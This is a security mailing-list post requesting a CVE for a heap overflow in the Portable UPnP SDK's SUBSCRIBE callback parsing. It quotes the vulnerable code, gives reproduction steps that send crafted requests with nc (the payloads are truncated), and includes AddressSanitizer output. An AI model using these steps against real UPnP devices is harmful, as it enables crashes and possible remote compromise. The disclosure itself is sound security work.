  oss-security - CVE Request: Heap Overflow Portable UPnP SDK through 1.8.x            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Thu, 8 Sep From: Scott Tenaglia <scott.tenaglia@...incea.com> To: oss-security@...ts.openwall.com Subject: CVE Request: Heap Overflow Portable UPnP SDK through 1.8.x  My previous request for a CVE seems to have been ignored. The only reason I can see is because I omitted the words "Heap Overflow" from the subject line. Resubmitting with amended subject line to get back in the queue.  Portable UPnP SDK: https://sourceforge.net/projects/pupnp/ Bug report:  There is a heap buffer overflow vulnerability in the create_url_list function in upnp/src/gena/gena_device.c. I first discovered this vulnerability when working with version and have confirmed that it also exists in the latest code on the master branch (1.8.x). At the very least a reliable denial of service condition can be created by crashing the program.  The problem in create_url_list starts in the following for-loop. The point of the loop is to parse the list of URIs enclosed in angled brackets (‘<‘ and ‘>’) in the CALLBACK header of a SUBSCRIBE request. If the call to parse_uri() fails for any reason other than UPNP_E_OUTOF_MEMORY, or the hostport field of the parsed URI has a size of zero, then the URLcount variable will not be incremented. If 2 URIs are provided, with the first one being correctly formatted, and the second not, then URLcount will equal 1 coming out of this loop.      for( i = 0; i < URLS->size; i++ ) {         if( ( URLS->buff[i] == '<' ) && ( i + 1 < URLS->size ) ) {             if( ( ( return_code = parse_uri( &URLS->buff[i + 1],                                              URLS->size - i + 1,                                              &temp ) ) == HTTP_SUCCESS )                 && ( temp.hostport.text.size != 0 ) ) {                 URLcount++;             } else {                 if( return_code == UPNP_E_OUTOF_MEMORY ) {                     return return_code;                 }             }         }     }  The next bit of code (abbreviated for readability) is where the overflow actually occurs. The first conditional evaluates to true because URLcount is 1. Next, a buffer is allocated (out->URLs) to hold a copy of the original URI string. Then, an array of uri_type structs are allocated (out->parsedURLs) to hold details of each parsed URI. The size of this array is going to be 1, because URLcount is 1. The problem is that the for-loop then parses the *original* URI string again. In fact, the only real difference between this for-loop and the previous one is that the parsed URIs are stored at successive indexes in the parsedURLs array instead of a temporary variable. So when it gets to parsing the second URI it passes out->parsedURLs[2] to the parse_uri() function, which is an address passed the end of the allocated array. As parse_uri() populates values of the struct it is writing passed the end of the array.      if( URLcount > 0 ) {         out->URLs = malloc(URLS->size + 1);         out->parsedURLs = malloc(sizeof(uri_type) * URLcount);         // omitted for readability         memcpy( out->URLs, URLS->buff, URLS->size );         out->URLs[URLS->size] = 0;         URLcount = 0;         for( i = 0; i < URLS->size; i++ ) {             if( ( URLS->buff[i] == '<' ) && ( i + 1 < URLS->size ) ) {                 if( ( ( return_code =                         parse_uri( &out->URLs[i + 1], URLS->size - i + 1,                                    &out->parsedURLs[URLcount] ) ) ==                       HTTP_SUCCESS )                     && ( out->parsedURLs[URLcount].hostport.text.size !=                          0 ) ) {                     URLcount++;                 } else {                     if( return_code == UPNP_E_OUTOF_MEMORY ) {                         free( out->URLs );                         free( out->parsedURLs );                         out->URLs = NULL;                         out->parsedURLs = NULL;                         return return_code;                     }                 }             }         }     }  Depending on the format of the malformed URI different things happen. Sometimes the overwrite has no noticeable impact, while other times it will crash the program. At the very least it is possible to create a reliable denial of service condition. It may also be possible to use this for remote code execution.  Below are the steps that I used to trigger the vulnerability on both version and They should be sufficient to recreate the issue.  First, compile for 32-bit with debugging enabled and an installation directory set. The reason for the setting the installation directory and compiling for 32-bits is so that “make install” results in a single binary that is easy to debug.  ./configure --prefix=<install dir> --enable-debug CFLAGS="-m32 -fno-omit-frame-pointer" LDFLAGS=-m32 make clean;make install  To setup the default sample, which emulates a TV device, do the following from the libupnp directory: cd upnp/sample mkdir tvdevice cp -r web tvdevice  To run the sample change to the directory you just created and run the binary: cd tvdevice ../.libs/tv_device  With the sample running go to another terminal window. Enter the following to create a non-malicious subscription message: printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST: upnp:event\r\nTIMEOUT: | nc  One form of a malicious message will crash the application is: printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST: upnp:event\r\nTIMEOUT: | nc  Another is: printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST: upnp:event\r\nTIMEOUT: | nc  Below is the output of address sanitizer from either of the two requests above (add “-fsanitize=address” to CFLAGS  during configure).  ================================================================= ERROR: AddressSanitizer: heap-buffer-overflow on address at pc bp sp WRITE of size 4 at thread T8     #0 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #1 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #2 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #3 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #4 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #5 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #6 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #7 (/home/user/Downloads/pupnp-code/install/lib/     #8     #9     #10     #11 is located 8 bytes to the right of region allocated by thread T8 here:     #0     #1 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #2 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #3 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #4 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #5 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #6 (/home/user/Downloads/pupnp-code/install/lib/     #7     #8 Thread T8 created by T0 here:     #0     #1 (/home/user/Downloads/pupnp-code/install/lib/     #2 (/home/user/Downloads/pupnp-code/install/lib/     #3 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #4 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #5 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.     #6 (/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_     #7 (/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_     #8 (/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_     #9 Shadow bytes around the buggy address:   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa[fa]fa fa fa fa fa fa fa 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:     fa   Heap righ redzone:     fb   Freed Heap region:     fd   Stack left redzone:    f1   Stack mid redzone:     f2   Stack right redzone:   f3   Stack partial redzone: f4   Stack after return:    f5   Stack use after scope: f8   Global redzone:        f9   Global init order:     f6   Poisoned by user:      f7   ASan internal:         fe ABORTING   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      